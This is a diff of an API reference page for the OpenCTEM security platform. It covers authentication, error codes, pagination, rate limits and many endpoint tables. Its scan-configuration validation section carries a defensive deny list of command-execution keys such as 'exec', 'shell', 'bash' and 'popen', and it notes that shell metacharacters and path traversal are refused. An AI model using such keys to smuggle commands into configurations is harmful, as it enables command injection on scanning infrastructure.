@@ -1,959 +1,118 @@
 # API Reference
 
+The authoritative, always-current reference is the OpenAPI spec generated from
+the handler annotations. Every running API serves it:
+
+- `GET /docs`: interactive API documentation
+- `GET /openapi.yaml`: the spec
+
+Locally, `make generate` at the repository root writes it to
+`api/api/openapi/swagger.yaml`. Route style rules: [API conventions](../architecture/api-conventions.md).
+This page covers what the spec does not: how to authenticate, the common
+response shapes, rate limits and input validation.
+
 ## Authentication
 
-The API supports multiple authentication providers:
+| Caller | Credential | Notes |
+|---|---|---|
+| Web console and scripts acting as a user | `Authorization: Bearer <access token>` (or the console's session cookie) | Access tokens are short-lived (default 15 minutes) and scoped to one organization |
+| Automation | Tenant API key: `Authorization: Bearer oct_…` or `X-API-Key: oct_…` | Read-only (GET/HEAD) on the REST API, limited to its scopes and to what its user can still do; see [API keys](../architecture/api-keys.md) |
+| Sensors | Sensor key (`octs_…`) on `/api/v2/sensor/*` only | See [sensor identity](../architecture/agent-identity.md) |
+| CI jobs | OIDC token exchanged for a run token on `/api/v1/ci/*` | See [Connect CI pipelines](../how-to/connect-ci-pipelines.md) |
+| Platform admin console | Console session cookie on `/api/v1/admin/*` only | |
 
-- **Local Auth**: Built-in JWT authentication
-- **OIDC/Keycloak**: External identity provider
-- **Hybrid**: Both local and OIDC tokens accepted
+`AUTH_PROVIDER` selects how users sign in: `local` (built-in accounts),
+`oidc` (an external OIDC provider such as Keycloak) or `hybrid` (both).
+Organizations can also use their own SSO (OIDC or SAML); see the SSO
+documentation at [docs.openctem.io](https://docs.openctem.io).
 
-### Headers
+### Local sign-in flow
 
-```
-Authorization: Bearer <access_token>
-```
-
-Scripts can use a tenant API key instead (`Authorization: Bearer oct_…` or
-`X-API-Key: oct_…`). On these routes a key is read-only (GET/HEAD) and limited
-to its scopes; see [API keys](../architecture/api-keys.md).
-
-### Local Authentication Flow
-
-1. **Register** - Create a new account
-2. **Login** - Get refresh token
-3. **Create/Select Team** - Choose a team to work with
-4. **Exchange Token** - Get tenant-scoped access token
+1. **Login** returns a refresh token and the user's organizations.
+2. **Exchange** the refresh token for an access token scoped to one
+   organization.
 
 ```bash
-# Register
-curl -X POST "http://localhost:8080/api/v1/auth/register" \
-  -H "Content-Type: application/json" \
-  -d '{"email": "user@example.com", "password": "password123", "name": "John Doe"}'
-
 # Login
-curl -X POST "http://localhost:8080/api/v1/auth/login" \
+curl -X POST "https://openctem.example.com/api/v1/auth/login" \
   -H "Content-Type: application/json" \
-  -d '{"email": "user@example.com", "password": "password123"}'
+  -d '{"email": "user@example.com", "password": "<password>"}'
 
-# Exchange for tenant-scoped token
-curl -X POST "http://localhost:8080/api/v1/auth/token" \
+# Exchange for an organization-scoped access token
+curl -X POST "https://openctem.example.com/api/v1/auth/token" \
   -H "Content-Type: application/json" \
-  -d '{"refresh_token": "<refresh_token>", "tenant_id": "<tenant_id>"}'
+  -d '{"refresh_token": "<refresh_token>", "tenant_id": "<organization id>"}'
 ```
 
----
+Public registration (`POST /api/v1/auth/register`) is off by default; accounts
+come from an administrator, an invitation or the organization's SSO.
 
-## REST API
+## Errors
 
-Base URL: `http://localhost:8080/api/v1`
-
-### Health & Metrics (Public)
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/health` | Health check |
-| GET | `/ready` | Readiness check |
-| GET | `/metrics` | Prometheus metrics |
-
-### Authentication (Public)
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/auth/info` | Auth provider info |
-| POST | `/auth/register` | Register new user |
-| POST | `/auth/login` | Login (get refresh token) |
-| POST | `/auth/token` | Exchange refresh token for access token |
-| POST | `/auth/refresh` | Refresh tokens |
-| POST | `/auth/logout` | Logout (requires auth) |
-| POST | `/auth/verify-email` | Verify email address |
-| POST | `/auth/forgot-password` | Request password reset |
-| POST | `/auth/reset-password` | Reset password |
-| POST | `/auth/create-first-team` | Create first team |
-
-### User Profile
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/users/me` | Get current user profile | JWT |
-| PUT | `/users/me` | Update profile | JWT |
-| PUT | `/users/me/preferences` | Update preferences | JWT |
-| GET | `/users/me/tenants` | List user's teams | JWT |
-| POST | `/users/me/change-password` | Change password | JWT (local) |
-| GET | `/users/me/sessions` | List sessions | JWT (local) |
-| DELETE | `/users/me/sessions` | Revoke all sessions | JWT (local) |
-| DELETE | `/users/me/sessions/:id` | Revoke session | JWT (local) |
-
-### Teams (Tenants)
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/tenants` | List user's teams | JWT |
-| POST | `/tenants` | Create new team | JWT |
-| GET | `/tenants/:tenant` | Get team details | JWT |
-| PATCH | `/tenants/:tenant` | Update team | Team admin+ |
-| DELETE | `/tenants/:tenant` | Delete team | Team owner |
-
-### Team Members
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/tenants/:tenant/members` | List members | Team member |
-| GET | `/tenants/:tenant/members?include=user` | List with user info | Team member |
-| GET | `/tenants/:tenant/members/stats` | Get member statistics | Team member |
-| POST | `/tenants/:tenant/members` | Add member | Team admin+ |
-| PATCH | `/tenants/:tenant/members/:id` | Update role | Team admin+ (owner only when the target is an administrator) |
-| DELETE | `/tenants/:tenant/members/:id` | Remove member | Team admin+ (owner only when the target is an administrator) |
-
-#### Member Statistics Response
+User and admin routes return the `pkg/apierror` envelope:
 
 ```json
 {
-  "total_members": 10,
-  "active_members": 8,
-  "pending_invites": 2,
-  "role_counts": {
-    "owner": 1,
-    "admin": 2,
-    "member": 5,
-    "viewer": 2
-  }
+  "code": "NOT_FOUND",
+  "message": "asset not found",
+  "details": {}
 }
 ```
 
-### Team Invitations
+`details` is optional.
 
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/tenants/:tenant/invitations` | List invitations | Team member |
-| POST | `/tenants/:tenant/invitations` | Create invitation | Team admin+ |
-| DELETE | `/tenants/:tenant/invitations/:id` | Cancel invitation | Team admin+ |
-| POST | `/invitations/lookup` | What an invitation grants (`{"token"}` in the body) | Public, rate limited |
-| POST | `/invitations/accept` | Accept invitation (`{"token"}` in the body) | JWT, invited email |
-| POST | `/invitations/accept-with-refresh` | Accept with the refresh token (no organization yet) | Refresh token |
-| POST | `/invitations/decline` | Decline invitation (`{"token"}` in the body) | Public, rate limited |
+`code` is the machine-readable contract. The sensor plane (`/api/v2/sensor/*`)
+returns RFC 9457 `application/problem+json`. Status codes:
 
-The `/invitations/:token/...` paths are deprecated aliases (RFC-041; `Deprecation`/`Sunset` headers, removal 2027-01-15).
+| Situation | Status |
+|---|---|
+| malformed input | 400 |
+| not authenticated | 401 |
+| not allowed, or module off (`MODULE_NOT_ENABLED`) | 403 |
+| outside the caller's organization or data scope | 404 (never 403, so existence is not confirmed) |
+| state conflict | 409 |
+| validation failed | 422 |
+| rate limited (with `Retry-After`) | 429 |
 
-### Team Settings
+## Pagination, sorting and filtering
 
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/tenants/:tenant/settings` | Get settings (security and risk scoring for owners/admins only) | Team member |
-| PATCH | `/tenants/:tenant/settings/general` | Update general settings | Team admin+ |
-| PATCH | `/tenants/:tenant/settings/security` | Update security settings | Team admin+ |
-| PATCH | `/tenants/:tenant/settings/branding` | Update branding settings | Team admin+ |
-
-Each section is saved on its own. Responses carry `etags` (one per section); send a section tag as `If-Match` to get `409 SETTINGS_CONFLICT` instead of overwriting a newer save. See [Organization Settings](../architecture/organization-settings.md).
-
-#### General Settings
+```
+GET /api/v1/assets?page=1&per_page=20&sort=-created_at
+```
 
 ```json
-{
-  "timezone": "UTC",
-  "language": "en",
-  "industry": "technology",
-  "website": "https://example.com"
-}
+{ "data": [...], "total": 150, "page": 1, "per_page": 20, "total_pages": 8 }
 ```
 
-#### Security Settings
+`per_page` defaults to 20 (max 100). Append-only collections (audit logs,
+events) use `cursor` / `next_cursor`. Filters follow the list query contract
+([list-query-contract.md](../architecture/list-query-contract.md)). Some older
+routes still accept their earlier parameter names; check the spec.
 
-```json
-{
-  "sso_enabled": false,
-  "sso_provider": "saml",
-  "mfa_required": false,
-  "session_timeout_min": 60,
-  "ip_whitelist": ["192.168.1.0/24"],
-  "allowed_domains": ["example.com"]
-}
-```
+## Rate limits
 
-#### API Settings
+Besides the general API limiter (`RATE_LIMIT_*`) and the sign-in limits
+([Redis guide](../redis-production-guide.md#authentication-rate-limits)), scan
+starts are limited per organization:
 
-```json
-{
-  "api_key_enabled": true,
-  "webhook_url": "https://example.com/webhook",
-  "webhook_events": ["finding.created", "scan.completed"]
-}
-```
+| Endpoint | Limit |
+|---|---|
+| `POST /api/v1/scans/{id}/trigger` | 20 per minute |
+| `POST /api/v1/scans/quick` | 10 per minute |
 
-#### Branding Settings
+A limited request gets `429` with `Retry-After`; the sign-in limiters also
+send `X-RateLimit-Limit`, `X-RateLimit-Remaining` and `X-RateLimit-Reset`.
 
-```json
-{
-  "primary_color": "#3B82F6",
-  "logo_dark_url": "https://example.com/logo-dark.png",
-  "logo_data": "data:image/png;base64,..."
-}
-```
+## Input validation for scan configuration
 
-### Audit Logs
+Scan and scan workflow step configuration is validated before it is stored or
+dispatched (`internal/app/security_validator.go`):
 
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/audit-logs` | List audit logs (`audit:read` is owner/admin only) | `audit:read` |
-| GET | `/audit-logs/stats` | Get audit statistics | `audit:read` |
-| GET | `/audit-logs/verify` | Verify hash-chain integrity. Returns 200 OK when the chain is intact, 409 Conflict with the offending entry when a break is detected. | admin only |
-| GET | `/dashboard/executive-summary/export?format=html` | Executive summary as print-ready HTML. Browser's Print dialog → "Save as PDF" produces the PDF report. Same endpoint also supports `format=json` (default) and `format=csv`. | `dashboard:read` |
-| GET | `/audit-logs/:id` | Get single audit log | `audit:read` |
-| GET | `/audit-logs/resource/:type/:id` | Get resource history | `audit:read` |
-| GET | `/audit-logs/user/:id` | Get user activity | `audit:read` |
+- values with shell metacharacters, command substitution or path traversal are
+  refused;
+- these keys are refused anywhere in a config: `command`, `cmd`, `exec`,
+  `execute`, `shell`, `bash`, `sh`, `script`, `eval`, `system`, `popen`,
+  `subprocess`, `spawn`, `run_command`, `os_command`, `raw_command`,
+  `custom_command`.
 
-#### Audit Log Response
-
-```json
-{
-  "id": "uuid",
-  "tenant_id": "uuid",
-  "actor_id": "uuid",
-  "actor_email": "user@example.com",
-  "action": "tenant.settings.updated",
-  "resource_type": "tenant",
-  "resource_id": "uuid",
-  "resource_name": "My Team",
-  "result": "success",
-  "severity": "info",
-  "message": "Security settings updated",
-  "changes": {
-    "mfa_required": { "old": false, "new": true }
-  },
-  "metadata": {},
-  "timestamp": "2024-01-15T10:30:00Z"
-}
-```
-
-#### Audit Actions
-
-- `tenant.created`, `tenant.updated`, `tenant.deleted`, `tenant.settings.updated`
-- `member.added`, `member.removed`, `member.role.changed`
-- `invitation.created`, `invitation.accepted`, `invitation.revoked`
-- `finding.created`, `finding.updated`, `finding.resolved`
-- `asset.created`, `asset.updated`, `asset.deleted`
-- `project.created`, `project.updated`, `project.deleted`
-- `user.login`, `user.logout`, `user.password.changed`
-
-### Assets
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/assets` | List assets | `assets:read` |
-| GET | `/assets/:id` | Get asset | `assets:read` |
-| POST | `/assets` | Create asset | `assets:write` |
-| PUT | `/assets/:id` | Update asset | `assets:write` |
-| DELETE | `/assets/:id` | Delete asset | `assets:delete` |
-
-### Projects
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/projects` | List projects | `projects:read` |
-| GET | `/projects/:id` | Get project | `projects:read` |
-| POST | `/projects` | Create project | `projects:write` |
-| PUT | `/projects/:id` | Update project | `projects:write` |
-| DELETE | `/projects/:id` | Delete project | `projects:delete` |
-
-### Components
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/components` | List components | `components:read` |
-| GET | `/components/:id` | Get component | `components:read` |
-| POST | `/components` | Create component | `components:write` |
-| PUT | `/components/:id` | Update component | `components:write` |
-| DELETE | `/components/:id` | Delete component | `components:delete` |
-| GET | `/projects/:id/components` | List project components | `components:read` |
-
-### Findings
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/findings` | List findings | `findings:read` |
-| GET | `/findings/:id` | Get finding | `findings:read` |
-| POST | `/findings` | Create finding | `findings:write` |
-| PATCH | `/findings/:id/status` | Update status | `findings:write` |
-| DELETE | `/findings/:id` | Delete finding | `findings:delete` |
-| GET | `/projects/:id/findings` | List project findings | `findings:read` |
-
-### Vulnerabilities (Global CVE Database)
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/vulnerabilities` | List vulnerabilities | `vulnerabilities:read` |
-| GET | `/vulnerabilities/:id` | Get vulnerability | `vulnerabilities:read` |
-| GET | `/vulnerabilities/cve/:cve_id` | Get by CVE ID | `vulnerabilities:read` |
-| POST | `/vulnerabilities` | Create vulnerability | `vulnerabilities:write` |
-| PUT | `/vulnerabilities/:id` | Update vulnerability | `vulnerabilities:write` |
-| DELETE | `/vulnerabilities/:id` | Delete vulnerability | `vulnerabilities:delete` |
-
-### Dashboard
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/dashboard/stats` | Tenant statistics | `dashboard:read` |
-
-### Agents
-
-Agents are distributed components (scanners, collectors) that execute security tasks on tenant infrastructure.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/agents` | List agents | `agents:read` |
-| GET | `/agents/:id` | Get agent | `agents:read` |
-| POST | `/agents` | Create agent (returns API key) | `agents:write` |
-| PUT | `/agents/:id` | Update agent | `agents:write` |
-| DELETE | `/agents/:id` | Delete agent | `agents:delete` |
-| POST | `/agents/:id/regenerate-key` | Regenerate API key | `agents:write` |
-
-#### Agent Types
-
-| Type | Description |
-|------|-------------|
-| `runner` | CI/CD one-shot scans |
-| `worker` | Server-controlled daemon |
-| `collector` | Data collection agent |
-| `sensor` | EASM sensor |
-
-#### Agent Status
-
-| Status | Description |
-|--------|-------------|
-| `pending` | Newly created, awaiting first connection |
-| `active` | Connected and operational |
-| `inactive` | Disconnected or idle |
-| `error` | Encountered an error |
-| `revoked` | Access revoked |
-
-#### Create Agent Response
-
-```json
-{
-  "agent": {
-    "id": "uuid",
-    "tenant_id": "uuid",
-    "name": "my-scanner",
-    "type": "worker",
-    "execution_mode": "daemon",
-    "status": "pending",
-    "capabilities": ["sast", "sca"],
-    "tools": ["semgrep", "trivy"],
-    "api_key_prefix": "octs_abc12",
-    "created_at": "2024-01-15T10:30:00Z"
-  },
-  "api_key": "octs_abc12..." // Only shown once on creation
-}
-```
-
-### Tool Registry
-
-The Tool Registry manages security tools available for scanning: platform tools
-(shared, managed by the platform) and each organization's custom tools, with
-the organization's own settings (switch, config overrides) of each.
-
-#### Tools
-
-One resource: the organization's view of the catalog (platform tools plus its
-own custom tools). See `docs/architecture/tool-availability.md`.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/tools` | List; filters `source`, `category`, `q`, `enabled`, `available`, `zone_id`, `sort`; `include=settings,availability,stats` | `scans:tools:read` (+ `scans:tenant_tools:read` per include) |
-| GET | `/tools/:id` | One tool (platform or own custom); `include=` as above | `scans:tools:read` |
-| POST | `/tools` | Create a custom tool | `scans:tools:write` |
-| PUT | `/tools/:id` | Update an own custom tool | `scans:tools:write` |
-| DELETE | `/tools/:id` | Delete an own custom tool | `scans:tools:delete` |
-| PATCH | `/tools/:id/settings` | The organization's switch and config overrides | `scans:tenant_tools:write` |
-| PATCH | `/tools/settings` | Switch several tools on or off | `scans:tenant_tools:write` |
-| GET | `/tool-categories` | Platform plus own categories (`source=`) | `scans:tools:read` |
-| GET | `/tool-categories/:id` | One category | `scans:tools:read` |
-| POST/PUT/DELETE | `/tool-categories[/:id]` | Own custom categories | `scans:tools:write` / `scans:tools:delete` |
-
-#### Capabilities
-
-One collection: the platform capabilities and the organization's own custom ones.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/capabilities` | List; filters `source=platform\|custom`, `category`, `q`; `page`, `per_page` (max 100); `include=usage` (tool and sensor counts) | `scans:tools:read` (`usage` also `scans:tenant_tools:read`) |
-| GET | `/capabilities/categories` | The categories in use | `scans:tools:read` |
-| GET | `/capabilities/:id` | One capability (platform or own custom); `include=usage` adds the tool and sensor names (sensor names need `sensors:read`) | `scans:tools:read` |
-| POST | `/capabilities` | Create a custom capability | `scans:tools:write` |
-| PUT | `/capabilities/:id` | Update an own custom capability (others 404) | `scans:tools:write` |
-| DELETE | `/capabilities/:id[?force=true]` | Delete an own custom capability (others 404; in use: 409 unless `force`) | `scans:tools:delete` |
-
-#### Combined Tool with Config
-
-GET `/tools/:id?include=config` returns tool with tenant-specific config:
-
-```json
-{
-  "tool": { ... },
-  "config": {
-    "is_enabled": true,
-    "priority": 1,
-    "config_overrides": {}
-  }
-}
-```
-
----
-
-### Pipelines
-
-Pipelines orchestrate multi-step security scan workflows.
-
-#### Templates
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/pipelines` | List templates | `pipelines:read` |
-| GET | `/pipelines/:id` | Get template with steps | `pipelines:read` |
-| POST | `/pipelines` | Create template | `pipelines:write` |
-| PUT | `/pipelines/:id` | Update template | `pipelines:write` |
-| DELETE | `/pipelines/:id` | Delete template | `pipelines:delete` |
-
-#### Steps
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| POST | `/pipelines/:id/steps` | Add step to template | `pipelines:write` |
-| PUT | `/pipelines/:id/steps/:stepId` | Update step | `pipelines:write` |
-| DELETE | `/pipelines/:id/steps/:stepId` | Delete step | `pipelines:delete` |
-
-#### Runs
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/pipelines/:id/runs` | List runs for template | `pipelines:read` |
-| POST | `/pipelines/:id/runs` | Trigger new run | `pipelines:write` |
-| GET | `/scan-runs/:id` | Get run details with step runs | `pipelines:read` |
-| POST | `/scan-runs/:id/cancel` | Cancel running pipeline | `pipelines:write` |
-
-**Rate Limiting:** `POST /scan-workflows/:id/runs` is rate limited to 30 requests/minute per tenant.
-
-#### Template Response
-
-```json
-{
-  "id": "uuid",
-  "tenant_id": "uuid",
-  "name": "Full Security Scan",
-  "description": "Comprehensive scan pipeline",
-  "version": 1,
-  "is_active": true,
-  "triggers": [
-    {
-      "type": "schedule",
-      "schedule": "0 2 * * *"
-    },
-    {
-      "type": "webhook",
-      "webhook": "unique-webhook-id"
-    }
-  ],
-  "settings": {
-    "max_parallel_steps": 3,
-    "fail_fast": false,
-    "retry_failed_steps": 2,
-    "timeout_seconds": 3600,
-    "notify_on_complete": true,
-    "notify_on_failure": true
-  },
-  "steps": [
-    {
-      "id": "uuid",
-      "step_key": "sast-scan",
-      "name": "SAST Analysis",
-      "order": 1,
-      "capabilities": ["sast"],
-      "tool": "semgrep",
-      "config": {"rules": ["security-audit"]},
-      "timeout_seconds": 1800,
-      "depends_on": [],
-      "max_retries": 2
-    }
-  ],
-  "created_at": "2024-01-15T10:30:00Z",
-  "updated_at": "2024-01-15T10:30:00Z"
-}
-```
-
-#### Trigger Types
-
-| Type | Description |
-|------|-------------|
-| `manual` | Manually triggered via API |
-| `schedule` | Cron-based schedule |
-| `webhook` | Triggered by webhook |
-| `api` | Triggered by API call |
-| `on_asset_discovery` | Auto-trigger on new asset |
-
-#### Run Status
-
-| Status | Description |
-|--------|-------------|
-| `pending` | Run created, not started |
-| `running` | Currently executing |
-| `completed` | Finished successfully |
-| `failed` | Failed with error |
-| `canceled` | Canceled by user |
-| `timeout` | Exceeded timeout |
-
----
-
-### Scans
-
-Scans bind asset groups with scanners/workflows and schedules to automate security scanning.
-
-#### Scan Management
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/scans` | List scans | `scans:read` |
-| GET | `/scans/stats` | Get scan statistics | `scans:read` |
-| GET | `/scans/:id` | Get scan | `scans:read` |
-| POST | `/scans` | Create scan | `scans:write` |
-| PUT | `/scans/:id` | Update scan | `scans:write` |
-| DELETE | `/scans/:id` | Delete scan | `scans:delete` |
-
-#### Scan Status Operations
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| POST | `/scans/:id/activate` | Activate scan (enable scheduling) | `scans:write` |
-| POST | `/scans/:id/pause` | Pause scan (suspend scheduling) | `scans:write` |
-| POST | `/scans/:id/disable` | Disable scan | `scans:write` |
-
-#### Scan Execution
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| POST | `/scans/:id/trigger` | Trigger scan execution manually | `scans:write` |
-| POST | `/scans/:id/clone` | Clone scan configuration | `scans:write` |
-
-**Rate Limiting:**
-- `POST /scans/:id/trigger`: 20 requests/minute per tenant
-- `POST /quick-scan`: 10 requests/minute per tenant (stricter)
-
-#### Scan Runs (Sub-resource)
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/scans/:scanId/runs` | List runs for scan | `scans:read` |
-| GET | `/scans/:scanId/runs/latest` | Get latest run | `scans:read` |
-| GET | `/scans/:scanId/runs/:runId` | Get specific run | `scans:read` |
-
-#### Scan Types
-
-| Type | Description |
-|------|-------------|
-| `workflow` | Execute a multi-step pipeline workflow |
-| `single` | Execute a single scanner tool |
-
-#### Schedule Types
-
-| Type | Description |
-|------|-------------|
-| `manual` | Manually triggered only |
-| `daily` | Run daily at specified time |
-| `weekly` | Run weekly on specified day |
-| `monthly` | Run monthly on specified day |
-| `crontab` | Custom cron expression |
-
-#### Scan Status
-
-| Status | Description |
-|--------|-------------|
-| `active` | Scan is active and will run on schedule |
-| `paused` | Scan is paused (scheduling suspended) |
-| `disabled` | Scan is disabled |
-
-#### Scan Response
-
-```json
-{
-  "id": "uuid",
-  "tenant_id": "uuid",
-  "name": "Vulnerability Scan - Production Servers",
-  "description": "Weekly vulnerability scan for production",
-  "asset_group_id": "uuid",
-  "scan_type": "workflow",
-  "scan_workflow_id": "uuid",
-  "scanner_name": null,
-  "scanner_config": null,
-  "targets_per_job": 30,
-  "schedule_type": "weekly",
-  "schedule_cron": null,
-  "schedule_day": 1,
-  "schedule_time": "02:00:00",
-  "schedule_timezone": "UTC",
-  "next_run_at": "2024-01-22T02:00:00Z",
-  "tags": ["internal", "infra"],
-  "run_on_tenant_runner": false,
-  "status": "active",
-  "last_run_id": "uuid",
-  "last_run_at": "2024-01-15T02:00:00Z",
-  "last_run_status": "completed",
-  "total_runs": 10,
-  "successful_runs": 9,
-  "failed_runs": 1,
-  "created_by": "uuid",
-  "created_at": "2024-01-01T10:30:00Z",
-  "updated_at": "2024-01-15T02:01:00Z"
-}
-```
-
-#### Scan Statistics Response
-
-```json
-{
-  "total": 15,
-  "active": 10,
-  "paused": 3,
-  "disabled": 2,
-  "by_schedule_type": {
-    "manual": 3,
-    "daily": 5,
-    "weekly": 4,
-    "monthly": 2,
-    "crontab": 1
-  },
-  "by_scan_type": {
-    "workflow": 12,
-    "single": 3
-  }
-}
-```
-
----
-
-### Platform Agents (v3.2)
-
-Platform agents are OpenCTEM-managed shared scanning infrastructure. Unlike tenant agents, platform agents are centrally managed and can process jobs from multiple tenants.
-
-#### Agent Registration (Public)
-
-| Method | Endpoint | Description | Auth |
-|--------|----------|-------------|------|
-| POST | `/platform/register/` | Register new platform agent | Bootstrap Token |
-
-Rate limited to prevent brute-force attacks on bootstrap tokens.
-
-**Request:**
-```json
-{
-  "bootstrap_token": "bst_abc123...",
-  "name": "scanner-us-east-1-01",
-  "capabilities": ["scan", "recon"],
-  "tools": ["nmap", "nikto"],
-  "region": "us-east-1",
-  "max_concurrent": 10,
-  "version": "1.0.0",
-  "hostname": "scanner-pod-abc123",
-  "labels": {"env": "production"}
-}
-```
-
-**Response:**
-```json
-{
-  "agent": {
-    "id": "uuid",
-    "name": "scanner-us-east-1-01",
-    "status": "active",
-    "capabilities": ["scan", "recon"],
-    "tools": ["nmap", "nikto"],
-    "region": "us-east-1"
-  },
-  "api_key": "pag_..." // Only shown once
-}
-```
-
-#### Agent Communication (API Key Auth)
-
-These endpoints use API key authentication via headers:
-- `X-Agent-ID: <agent_id>`
-- `X-API-Key: <api_key>`
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| PUT | `/platform/agent/lease` | Renew agent lease (heartbeat) |
-| DELETE | `/platform/agent/lease` | Release agent lease (graceful shutdown) |
-| POST | `/platform/agent/poll` | Long-poll for available jobs |
-| POST | `/platform/agent/jobs/{jobID}/ack` | Acknowledge job receipt |
-| POST | `/platform/agent/jobs/{jobID}/result` | Report job result |
-| POST | `/platform/agent/jobs/{jobID}/progress` | Report job progress |
-
-#### Lease Renewal (Heartbeat)
-
-**PUT `/platform/agent/lease`**
-
-```json
-{
-  "holder_identity": "pod-scanner-abc123",
-  "lease_duration_seconds": 60,
-  "current_jobs": 3,
-  "max_jobs": 10,
-  "cpu_percent": 45.5,
-  "memory_percent": 62.0
-}
-```
-
-**Response:**
-```json
-{
-  "success": true,
-  "resource_version": 42,
-  "renew_time": "2024-01-15T10:30:00Z"
-}
-```
-
-#### Job Polling
-
-**POST `/platform/agent/poll`**
-
-```json
-{
-  "max_jobs": 5,
-  "capabilities": ["scan"],
-  "timeout_seconds": 30
-}
-```
-
-**Response:**
-```json
-{
-  "jobs": [
-    {
-      "id": "uuid",
-      "tenant_id": "uuid",
-      "type": "scan",
-      "priority": "high",
-      "payload": {"target": "example.com"},
-      "timeout_sec": 3600,
-      "auth_token": "job_token_...",
-      "created_at": "2024-01-15T10:00:00Z"
-    }
-  ],
-  "poll_interval_hint": 5,
-  "queue_depth": 10
-}
-```
-
-#### Report Job Result
-
-**POST `/platform/agent/jobs/{jobID}/result`**
-
-```json
-{
-  "status": "completed",
-  "findings_count": 5,
-  "duration_ms": 12345,
-  "result": {"findings": [...]}
-}
-```
-
-#### Platform Jobs (Tenant API)
-
-Tenants can submit jobs to be processed by platform agents.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| POST | `/platform-jobs/` | Submit new job | `scans:write` |
-| GET | `/platform-jobs/` | List tenant's jobs | `scans:read` |
-| GET | `/platform-jobs/{id}` | Get job status | `scans:read` |
-| POST | `/platform-jobs/{id}/cancel` | Cancel job | `scans:write` |
-
-#### Bootstrap Tokens (Admin)
-
-Admin endpoints for managing bootstrap tokens.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/admin/platform/bootstrap-tokens` | List tokens | Admin |
-| POST | `/admin/platform/bootstrap-tokens` | Create token | Admin |
-| DELETE | `/admin/platform/bootstrap-tokens/{id}` | Revoke token | Admin |
-
-### Runtime Telemetry (retired)
-
-> **Retired 2026-10-05.** This route was part of sensor protocol v1
-> (`/api/v1/agent/telemetry-events`), which was removed
-> ([RFC-029](../rfcs/RFC-029-sensor-protocol-v2-and-sdk-stability.md)).
-> Protocol v2 has no telemetry route yet, so SIEM inbound is unavailable
-> until one ships. Stored events and the IOC catalogue are kept.
-
-### Sensor Results, Protocol v2 (Sensor API Key Auth)
-
-[RFC-026](../rfcs/RFC-026-sensor-results-ingest.md). Base path `/api/v2/sensor`
-(not `/api/v1`). Contract: [`api/openapi/sensor-protocol-v2.yaml`](../../api/openapi/sensor-protocol-v2.yaml);
-behaviour: [`docs/architecture/sensors.md`](../architecture/sensors.md#protocol-v2-results-ingest).
-Only a sensor key authenticates here. Every `PUT` needs
-`Content-Type: application/vnd.openctem.ctis.v1+json`, `Content-Length` and
-`Content-Digest` (RFC 9530, over the bytes as sent); `Content-Encoding` may be
-`gzip` or `zstd`. Errors are RFC 9457 `application/problem+json` with
-`type: https://openctem.io/problems/ingest/<name>`.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/hello` | Protocol, features and limits | Sensor API key |
-| PUT | `/results/{report_id}` | Whole CTIS report (one segment, implicit commit). `202` + `Location` + status; identical replay `200`; other bytes `409` | Sensor API key |
-| PUT | `/results/{report_id}/segments/{seq}` | One self-describing segment of a large report | Sensor API key |
-| POST | `/results/{report_id}/commit` | `{"segment_count":n,"segment_digests":[…]}`; only a committed report auto-resolves | Sensor API key |
-| GET | `/results/{report_id}` | Status: state, accepted/rejected counts, item errors, auto-resolve outcome | Sensor API key |
-| DELETE | `/results/{report_id}` | Abandon an uncommitted report | Sensor API key |
-| PUT/POST | `/commands/{command_id}/results/…` | Same three writes, bound to a command the sensor claimed | Sensor API key |
-
-Raw SARIF or scanner files are not accepted here; the SDK converts them to CTIS.
-
-### IOC Catalogue (Tenant-scoped)
-
-Indicators (IP, domain, URL, file hash, process name, user agent) are matched
-against runtime telemetry to close the CTEM loop. A match on an indicator linked
-to a closed finding auto-reopens it (invariant B6).
-
-Permissions reuse `threat_intel:read` / `threat_intel:write` — an IOC is
-semantically a tenant-scoped piece of threat intel.
-
-| Method | Endpoint | Description | Permission |
-|--------|----------|-------------|------------|
-| GET | `/iocs?limit=50&offset=0` | List indicators (most recently seen first). Hard cap 200/page. | `threat_intel:read` |
-| POST | `/iocs` | Register a new indicator. Body: `{"type":"ip\|domain\|url\|file_hash\|process_name\|user_agent","value":"...","source":"manual\|scan_finding\|threat_feed","source_finding_id":"<uuid-optional>","confidence":75}`. | `threat_intel:write` |
-| GET | `/iocs/{id}` | Get a single indicator | `threat_intel:read` |
